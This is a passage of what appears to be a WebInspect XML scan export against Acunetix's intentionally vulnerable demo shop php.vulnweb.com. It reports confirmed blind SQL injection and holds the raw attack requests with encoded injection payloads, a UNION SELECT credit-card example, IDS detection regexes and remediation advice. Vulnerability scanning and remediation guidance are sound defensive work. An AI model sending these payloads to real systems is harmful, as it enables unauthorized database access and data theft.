	  <li><a href="http://www.eclectasy.com/Fractal-Explorer/index.html">Fractal Explorer</a></li> 
    </ul> 
  </div> 
  <div id="advert"> 
    <p>
      <object classid="clsid:D27CDB6E-AE6D-11cf-96B8-444553540000" codebase="http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#version=6,0,29,0" width="107" height="66">
        <param name="movie" value="Flash/add.swf">
        <param name=quality value=high>
        <embed src="Flash/add.swf" quality=high pluginspage="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" type="application/x-shockwave-flash" width="107" height="66"></embed>
      </object>
    </p>
  </div> 
</div> 

<!--end navbar --> 
<div id="siteInfo">  <a href="http://www.acunetix.com">About Us</a> | <a href="privacy.php">Privacy Policy</a> | <a href="mailto:wvs@acunetix.com">Contact Us</a> | &copy;2019
  Acunetix Ltd 
</div> 
<br> 
<div style="background-color:lightgray;width:100%;text-align:center;font-size:12px;padding:1px">
<p style="padding-left:5%;padding-right:5%"><b>Warning</b>: This is not a real shop. This is an example PHP application, which is intentionally vulnerable to web attacks. It is intended to help you test Acunetix. It also helps you understand how developer errors and bad configuration may let someone break into your website. You can use it to test other tools and your manual hacking skills as well. Tip: Look for potential SQL Injections, Cross-site Scripting (XSS), and Cross-site Request Forgery (CSRF), and more.</p>
</div>
</div>
</body>
<!-- InstanceEnd --></html>
]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:50 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/html; charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>4803</Value></Header></Headers><SetCookies /><Forms><Form><Action>search.php?test=query</Action><Method>post</Method><Name /><OnSubmit /><InputFields><InputField><Name>searchFor</Name><Value /><Size>10</Size><MaxLength>0</MaxLength><sType>text</sType><Class /></InputField><InputField><Name>goButton</Name><Value>go</Value><Size /><MaxLength>0</MaxLength><sType>submit</sType><Class /></InputField></InputFields><TextAreas /><SelectFields /></Form></Forms></Response></Session><Session requestId="06ABDBEC8F04FD8EA74B1C5F567BBC2D"><URL>http://php.vulnweb.com:80/AJAX/infocateg.php?id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>id</AttackParamDescriptor><Issues><Issue id="cbeb8ef3-272f-4267-b908-7a6734afa89d"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[GET /AJAX/infocateg.php?id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="06ABDBEC8F04FD8EA74B1C5F567BBC2D";PSID="80E3ABD0AC82CA4800C74AC685B13410";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="303a66f8";
X-Request-Memo: ID="a604399f";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></AttackHTTPRequest><VulnerabilityID>11299</VulnerabilityID><Severity>4</Severity><Name>Blind SQL Injection (Confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<hp-img src="sql.rgc" /><br /><drc_sqli />


Critical Blind SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. Normal SQL Injection attacks depend in a large measure on an attacker reverse engineering portions of the original SQL query using information gained from error messages.  However, your application can still be susceptible to Blind SQL injection even if no error message is displayed.  If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

Regex for detection of SQL meta-characters:<br />
/(\%27)|(\')|(\-\-)|(\%23)|(#)/ix<br /><br />

The above regular expression would be added into a Snort rule as follows:<br /><br />

alert tcp $EXTERNAL_NET any -&gt; $HTTP_SERVERS $HTTP_PORTS (msg:"SQL Injection
- Paranoid";
flow:to_server,established;uricontent:".pl";pcre:"/(\%27)|(\')|(\-\-)|(%23)|
(#)/i"; classtype:Web-application-attack; sid:9099; rev:5;)<br /><br />
	
Regex for typical SQL Injection attacks:<br />
/\w*((\%27)|(\'))((\%6F)|o|(\%4F))((\%72)|r|(\%52))/ix<br /><br />

Regex for detecting SQL Injection with the UNION keyword:<br />
/((\%27)|(\'))union/ix<br />
(\%27)|(\') <br />
the single-quote and its hex equivalent union - the keyword union<br /><br />

Similar expressions can be written for other SQL queries such as select, insert, update, delete, drop, and so on.<br /><br />

Regex for detecting SQL Injection attacks on a MS SQL Server:<br />
/exec(\s|\+)+(s|x)p\w+/ix

<br /><br /><b>






For QA: </b><br />

Fixes for SQL Injection defects will ultimately require code based fixes. The steps detailed in the Developer and Security Operations section will provide any developer with the information necessary to remediate these issues. The following steps outline how to manually test an application for SQL Injection. <br /><br /><b>

How to manually test applications for SQL Injection:</b><br />

1. Open the web application you wish to test for SQL Injection defects in a browser. <br /><br />

2. Mouse over the links of the Web site with your cursor while paying attention to the bottom status bar. You will notice the URLs that the links point to. Try to find a URL with parameters in it. Ex. http://www.site.com/articleid.asp?id=42. <br /><br />

Note: If you don't see any URL's in the status bar, then just click on links and watch the address bar until you find a URL that has parameters. <br /><br />

3. Once a URL with parameters has been found, click the link and go to that page. In the Address bar you should now see the URL that was seen in the status bar. <br /><br />

4. There are two methods for testing scripts for SQL injection. Be sure to test each parameter value one at a time with both methods. <br /><br /><b>Method 1.</b> Go to the address bar, click your cursor, and highlight a parameter value Ex. Highlight the word value in "name=value" and replace it with a single quote (').It should now look like "name=' " <br /><br /><b>Method 2. </b>Go to the address bar, click your cursor, and put a single quote (') in the middle of the value. It should now look like "name=val'ue" <br /><br />

5. Click the 'GO' button. This will send your request to the Web server. <br /><br />

6. Analyze the response from the Web server for any error messages. Most database error messages will look similar to the examples below: <br /><br /><b>Example error 1:</b><br />
Microsoft OLE DB Provider for SQL Server error '80040e14' <br />
Unclosed quotation mark before the character string '51 ORDER BY <br />
some_name'. /some_directory/some_file.asp, line 5 <br /><br /><b>Example error 2: </b><br />
ODBC Error Code = S1000 (General error) <br />
[Oracle][ODBC][Ora]ORA-00933: SQL command not properly ended <br /><br /><b>Example error 3: </b><br />
Error: 1353 SQLSTATE: HY000 (ER_VIEW_WRONG_LIST) <br />
Message: View's SELECT and view's field list have different column counts <br /><br />

7. Sometimes the error message is not obvious and is hidden in the source of the page. To look for it, you must view the HTML source of the page and search for the error. To do this in Internet Explorer, click the 'View' menu, and select the 'Source' option. This will cause notepad to open with the HTML source of the page. In notepad, click the 'Edit' menu and select 'Find'. A dialog box will appear that will ask you to 'Find What'. Type the phrase 'Microsoft OLE DB' or '[ODBC]' and click 'Find Next'. <br /><br />

8. If either step 6 or 7 is successful, then the Web site is vulnerable to SQL injection.<br />]]></SectionText></ReportSection><ReportSection><Name>Reference Info</Name><SectionText><![CDATA[<br />

Microsoft<br /><a href="http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx">http://msdn.microsoft.com/msdnmag/issues/04/09/SQLInjection/default.aspx</a><br /><a href="http://support.microsoft.com/default.aspx?scid=kb;en-us;302570">http://support.microsoft.com/default.aspx?scid=kb;en-us;302570</a><br /><br />

SQLSecurity.com<br /><a href="http://www.sqlsecurity.com/DesktopDefault.aspx">http://www.sqlsecurity.com/DesktopDefault.aspx</a><br /><br />

OWASP<br /><a href="http://www.owasp.org/index.php/SQL_Injection">http://www.owasp.org/index.php/SQL_Injection</a><br />]]></SectionText></ReportSection></Issue></Issues><RawRequest id="06ABDBEC8F04FD8EA74B1C5F567BBC2D"><![CDATA[GET /AJAX/infocateg.php?id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6 HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="06ABDBEC8F04FD8EA74B1C5F567BBC2D";PSID="80E3ABD0AC82CA4800C74AC685B13410";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="42";tt="40";
X-RequestManager-Memo: sid="33";smi="0";sc="1";ID="303a66f8";
X-Request-Memo: ID="a604399f";sc="1";tid="42";
Cookie: CustomCookie=WebInspect0

]]></RawRequest><RawResponse><![CDATA[HTTP/1.1 200 OK
Via: 1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)
Date: Fri, 11 Dec 2020 21:47:50 GMT
Server: nginx/1.19.0
Connection: keep-alive
Content-Type: text/xml;charset=UTF-8
X-Powered-By: PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1
Content-Length: 21

<iteminfo></iteminfo>]]></RawResponse><Request id="06ABDBEC8F04FD8EA74B1C5F567BBC2D"><Method>GET</Method><Path>/AJAX/</Path><File>infocateg</File><Ext>php</Ext><PageMark /><HTTPVersion>HTTP/1.1</HTTPVersion><FullQuery>id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</FullQuery><FullPostData /><XMLPostData /><MultiPartPostData /><RawASCIIPostData><![CDATA[]]></RawASCIIPostData><Cookie>Cookie: CustomCookie=WebInspect0
</Cookie><Queries><Query><Name>id</Name><Value>1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6</Value></Query></Queries><Headers><Header><Name>Referer</Name><Value>http://php.vulnweb.com/AJAX/index.php</Value></Header><Header><Name>Host</Name><Value>php.vulnweb.com</Value></Header><Header><Name>Accept</Name><Value>*/*</Value></Header><Header><Name>Accept-Language</Name><Value>en-US,en;q=0.5</Value></Header><Header><Name>Accept-Encoding</Name><Value>gzip, deflate</Value></Header><Header><Name>Pragma</Name><Value>no-cache</Value></Header><Header><Name>User-Agent</Name><Value>Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0</Value></Header><Header><Name>Connection</Name><Value>Keep-Alive</Value></Header><Header><Name>X-WIPP</Name><Value>AscVersion=20.1.0.199</Value></Header><Header><Name>X-Scan-Memo</Name><Value>Category="Audit.Attack";SID="06ABDBEC8F04FD8EA74B1C5F567BBC2D";PSID="80E3ABD0AC82CA4800C74AC685B13410";SessionType="AuditAttack";CrawlType="None";AttackType="QueryParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="42";tt="40";</Value></Header><Header><Name>X-RequestManager-Memo</Name><Value>sid="33";smi="0";sc="1";ID="303a66f8";</Value></Header><Header><Name>X-Request-Memo</Name><Value>ID="a604399f";sc="1";tid="42";</Value></Header></Headers><Cookies><Cookie><Name>CustomCookie</Name><Value>WebInspect0</Value><Domain /><Path /></Cookie></Cookies></Request><Response><HTTPVersion>HTTP/1.1</HTTPVersion><StatusCode>200</StatusCode><StatusDescription>OK</StatusDescription><SetCookie /><ResponseBody><![CDATA[<iteminfo></iteminfo>]]></ResponseBody><Headers><Header><Name>Via</Name><Value>1.1 189.9.60.27 (McAfee Web Gateway 7.8.2.16.0.31231)</Value></Header><Header><Name>Date</Name><Value>Fri, 11 Dec 2020 21:47:50 GMT</Value></Header><Header><Name>Server</Name><Value>nginx/1.19.0</Value></Header><Header><Name>Connection</Name><Value>keep-alive</Value></Header><Header><Name>Content-Type</Name><Value>text/xml;charset=UTF-8</Value></Header><Header><Name>X-Powered-By</Name><Value>PHP/5.6.40-38+ubuntu20.04.1+deb.sury.org+1</Value></Header><Header><Name>Content-Length</Name><Value>21</Value></Header></Headers><SetCookies /><Forms /></Response></Session><Session requestId="9E187A97669FE40743417D8CB336DAB3"><URL>http://php.vulnweb.com:80/AJAX/infotitle.php</URL><Scheme>http</Scheme><Host>php.vulnweb.com</Host><Port>80</Port><AttackParamDescriptor>id</AttackParamDescriptor><Issues><Issue id="a25c3906-54d5-4961-b57f-4c0724d48d2d"><CheckTypeID>Vulnerability</CheckTypeID><EngineType>5657</EngineType><AttackHTTPRequest><![CDATA[POST /AJAX/infotitle.php HTTP/1.1
Referer: http://php.vulnweb.com/AJAX/index.php
Host: php.vulnweb.com
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
content-type: application/x-www-form-urlencoded
Content-Length: 75
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 6.2; Win64; x64; rv:58.0) Gecko/20100101 Firefox/58.0
Connection: Keep-Alive
X-WIPP: AscVersion=20.1.0.199
X-Scan-Memo: Category="Audit.Attack";SID="9E187A97669FE40743417D8CB336DAB3";PSID="CD6AE2AAEA951B3E1FA12B842A3E9C59";SessionType="AuditAttack";CrawlType="None";AttackType="PostParamManipulation";OriginatingEngineID="9722923f-f8d3-49c2-90bd-7c0e15901c18";AttackSequence="72";AttackParamDesc="id";AttackParamIndex="0";AttackParamSubIndex="0";CheckId="5657";Engine="Sql+Injection";SmartMode="4";AttackString="1%2509AND%2509(select%2509ASCII(SUBSTR(schema()%252c7%252c1)))%2509%253c0%2509Or%25093%253d6";AttackStringProps="Attack";tid="41";tt="40";
X-RequestManager-Memo: sid="31";smi="0";sc="1";ID="df37def5";
X-Request-Memo: ID="4a925811";sc="1";tid="41";
Cookie: CustomCookie=WebInspect0

id=1%09AND%09(select%09ASCII(SUBSTR(schema()%2c7%2c1)))%09%3c0%09Or%093%3d6]]></AttackHTTPRequest><VulnerabilityID>11299</VulnerabilityID><Severity>4</Severity><Name>Blind SQL Injection (Confirmed)</Name><Classifications><Classification kind="CWE" identifier="CWE-89" href="http://cwe.mitre.org/data/definitions/89.html">CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')</Classification><Classification kind="7PK" identifier="Input Validation and Representation" href="https://vulncat.fortify.com/">Input Validation and Representation</Classification><Classification kind="7PK Category" identifier="SQL Injection" href="https://vulncat.fortify.com/">SQL Injection</Classification></Classifications><ReportSection><Name>Summary</Name><SectionText><![CDATA[<hp-img src="sql.rgc" /><br /><drc_sqli />


Critical Blind SQL Injection vulnerabilities have been identified in the web application. SQL injection is a method of attack where an attacker can exploit vulnerable code and the type of data an application will accept, and can be exploited in any application parameter that influences a database query. Examples include parameters within the url itself, post data, or cookie values. Normal SQL Injection attacks depend in a large measure on an attacker reverse engineering portions of the original SQL query using information gained from error messages.  However, your application can still be susceptible to Blind SQL injection even if no error message is displayed.  If successful, SQL Injection can give an attacker access to backend database contents, the ability to remotely execute system commands, or in some circumstances the means to take control of the server hosting the database. Recommendations include employing a layered approach to security that includes utilizing parameterized queries when accepting user input, ensuring that only expected data is accepted by an application, and hardening the database server to prevent data from being accessed inappropriately.]]></SectionText></ReportSection><ReportSection><Name>Implication</Name><SectionText><![CDATA[<br />Fundamentally, SQL Injection is an attack upon the web application, not the web server or the operating system itself. As the name implies, SQL Injection is the act of adding an unexpected SQL commands to a query, thereby manipulating the database in ways unintended by the database administrator or developer. When successful, data can be extracted, modified, inserted or deleted from database servers that are used by vulnerable web applications. In certain circumstances, SQL Injection can be utilized to take complete control of a system.]]></SectionText></ReportSection><ReportSection><Name>Execution</Name><SectionText><![CDATA[<br />Consider a login form for a web application. If the user input from the form is directly utilized to build a dynamic SQL statement, then there has been no input validation conducted, giving control to an attacker who wants access to the database. Basically, an attacker can use an input box to send their own request to the server, and then utilize the results in a malicious manner. This is a very typical scenario considering that HTML pages often use the POST command to send parameters to another ASP page.  
The number in bold might be supplied by the client in an HTTP GET or POST parameter, like in the following URL:<br /><br />

http://www.example.com/GetItemPrice?ItemNumber=<b>12345</b><br /><br />

In the example above, the client-supplied value, <b>12345</b>, is simply used as a numeric expression to indicate the item that the user wants to obtain the price of an item. The web application takes this value and inserts it into the SQL statement in between the single quotes in the WHERE clause.  However, consider the following URL:

<br /><br />http://www.example.com/GetItemPrice?ItemPrice?ItemNumber=0' UNION SELECT CreditCardNumber FROM Customers WHERE '1'='1<br /><br />

In this case, the client-supplied value has actually modified the SQL statement itself and 'injected' a statement of his or her choosing. Instead of the price of an item, this statement will retrieve a customer's credit card number.




]]></SectionText></ReportSection><ReportSection><Name>Fix</Name><SectionText><![CDATA[<br />Each method of preventing SQL injection has its own limitations. Therefore, it is wise to employ a layered approach to preventing SQL injection, and implement several measures to prevent unauthorized access to your backend database. The following are recommended courses of action to take to prevent SQL Injection and Blind SQL Injection vulnerabilities from being exploited in your web application.<br /><br /><b>For Development:</b><br /><br />
Use the following recommendations to code web applications that are not susceptible to SQL Injection attacks. 
<ul><li><b>Parameterized Queries:</b> SQL Injection arises from an attacker’s manipulation of query data to modify query logic. The best method of preventing SQL Injection attacks is thereby to separate the logic of a query from its data. This will prevent commands inserted from user input from being executed. The downside of this approach is that it can have an impact on performance, albeit slight, and that each query on the site must be structured in this method for it to be completely effective. If one query is inadvertently bypassed, that could be enough to leave the application vulnerable to SQL Injection. The following code shows a sample SQL statement that is SQL injectable. <br /><br />

sSql = "SELECT LocationName FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = " + Request["LocationID"];<br />
oCmd.CommandText = sSql;<br /><br />

The following example utilizes parameterized queries, and is safe from SQL Injection attacks. <br /><br />

sSql = "SELECT * FROM Locations ";<br />
sSql = sSql + " WHERE LocationID = @LocationID";<br />
oCmd.CommandText = sSql;<br />
oCmd.Parameters.Add("@LocationID", Request["LocationID"]);<br />

The application will send the SQL statement to the server without including the user’s input. Instead, a parameter-@LocationID- is used as a placeholder for that input. In this way, user input never becomes part of the command that SQL executes. Any input that an attacker inserts will be effectively negated. An error would still be generated, but it would be a simple data-type conversion error, and not something which a hacker could exploit. <br /><br />

The following code samples show a product ID being obtained from an HTTP query string, and used in a SQL query. Note how the string containing the “SELECT” statement passed to SqlCommand is simply a static string, and is not concatenated from input. Also note how the input parameter is passed using a SqlParameter object, whose name (“@pid”) matches the name used within the SQL query.<br /><br />

C# sample:<br /><br />
        string connString = WebConfigurationManager.ConnectionStrings["myConn"].ConnectionString;<br />
        using (SqlConnection conn = new SqlConnection(connString)) <br />
        { <br />
            conn.Open();<br />

            SqlCommand cmd = new SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn); <br />

            SqlParameter prm = new SqlParameter("@pid", SqlDbType.VarChar, 50); <br />
            prm.Value = Request.QueryString["pid"]; <br />
            cmd.Parameters.Add(prm); <br />

            int recCount = (int)cmd.ExecuteScalar();<br />
        } <br /><br />
VB.NET sample: <br /><br />

        Dim connString As String = WebConfigurationManager.ConnectionStrings("myConn").ConnectionString<br />
        Using conn As New SqlConnection(connString) <br />
            conn.Open()<br />

            Dim cmd As SqlCommand = New SqlCommand("SELECT Count(*) FROM Products WHERE ProdID=@pid", conn)
<br />
            Dim prm As SqlParameter = New SqlParameter("@pid", SqlDbType.VarChar, 50) <br />
            prm.Value = Request.QueryString("pid") <br />
            cmd.Parameters.Add(prm) <br />

            Dim recCount As Integer = cmd.ExecuteScalar()<br />
        End Using<br /><br /></li><li><b>Validate input: </b>The vast majority of SQL Injection checks can be prevented by properly validating user input for both type and format. The best method of doing this is via “white listing”. This is defined as only accepting specific account numbers or specific account types for those relevant fields, or only accepting integers or letters of the English alphabet for others. Many developers will try to validate input by “black listing” characters, or “escaping” them. Basically, this entails rejecting known bad data, such as a single quotation mark, by placing an “escape” character in front of it so that the item that follows will be treated as a literal value. This approach is not as effective as white listing because it is impossible to know all forms of bad data ahead of time. 


</li></ul><b>For Security Operations:</b><br />
Use the following recommendations to help prevent SQL Injection attacks upon your web applications. 

<ul><li><b>Restrict Application Privileges: </b>Limit user credentials so that only those rights the application needs to function are utilized. Any successful SQL Injection attack would run in the context of the user’s credential. While limiting privileges will not prevent SQL Injection attacks outright, it will make them significantly harder to enact.  </li><br /><li><b>Strong SA Password Policy:</b> Often, an attacker will need the functionality of the administrator account to utilize specific SQL commands. It is much easier to “brute force” the SA password when it is weak, and will increase the likelihood of a successful SQL Injection attack. Another option is not to use the SA account at all, and instead create specific accounts for specific purposes.</li><br /><li><b>Consistent Error Messaging Scheme: </b>Ensure that you provide as little information to the user as possible when a database error occurs. Don’t reveal the entire error message. Error messages need to be dealt with on both the web and application server. When a web server encounters a processing error it should respond with a generic web page, or redirect the user to a standard location. Debug information, or other details that could be useful to a potential attacker, should never be revealed. Application servers, like WebSphere, often install with error messages or debug settings enabled by default. Consult your application server’s documentation for information on suppressing those error messages. </li><br /><br /><li><b>Stored Procedures:</b> If unused, delete SQL stored procedures such as master..Xp_cmdshell, xp_startmail, xp_sendmail, and sp_makewebtask.</li></ul>

SQL Injection vulnerabilities are inherently tied to the actual code of your web application. While not a fix, you can implement an emergency measure by adding a rule that incorporates a regular expression to your IDS to check for SQL Injection attacks.  While this will not resolve all possible SQL injection vulnerabilities, it is simple to implement, and will require an attacker to escalate his methodology to achieve a successful attack. Regular expressions that can be utilized to do this follow.

<br /><br />

